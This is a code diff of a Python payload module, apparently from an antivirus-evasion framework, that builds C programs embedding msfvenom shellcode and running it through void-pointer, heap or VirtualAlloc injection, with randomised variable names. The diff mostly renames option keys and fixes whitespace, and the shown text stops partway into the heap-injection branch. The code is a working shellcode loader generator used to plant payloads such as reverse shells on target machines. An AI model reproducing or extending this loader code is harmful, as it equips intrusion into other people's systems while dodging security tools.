@@ -14,7 +14,7 @@ from modules.common import shellcode
 from modules.common import helpers
 
 class Payload:
-    
+
     def __init__(self):
         # required options
         self.description = "C Combination of all Injection Methods w/no Obfuscation"
@@ -23,30 +23,32 @@ class Payload:
         self.extension = "c"
 
         self.shellcode = shellcode.Shellcode()
-        # options we require user ineraction for- format is {Option : [Value, Description]]}
-        self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
-                                 "inject_method" : ["Virtual", "Void, Virtual, or Heap"]}
+        # options we require user ineraction for- format is {OPTION : [Value, Description]]}
+        self.required_options = {
+                                    "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
+                                    "INJECT_METHOD"  : ["Virtual", "Void, Virtual, or Heap"]
+                                }
 
     def generate(self):
-        
+
         # Generate Shellcode Using msfvenom
         Shellcode = self.shellcode.generate()
-        
+
         # Generate Random Variable Names
         RandShellcode = helpers.randomString()
         RandReverseShell = helpers.randomString()
         RandMemoryShell = helpers.randomString()
 
-        if self.required_options["inject_method"][0].lower() == "void":
+        if self.required_options["INJECT_METHOD"][0].lower() == "void":
 
             # Start creating our void pointer C payload
             PayloadCode = 'unsigned char payload[]=\n'
             PayloadCode += '\"' + Shellcode + '\";\n'
             PayloadCode += 'int main(void) { ((void (*)())payload)();}\n'
-        
+
             return PayloadCode
 
-        elif self.required_options["inject_method"][0].lower() == "heap":
+        elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
 
             # Create out heap injecting C payload
             PayloadCode = '#include <windows.h>\n'
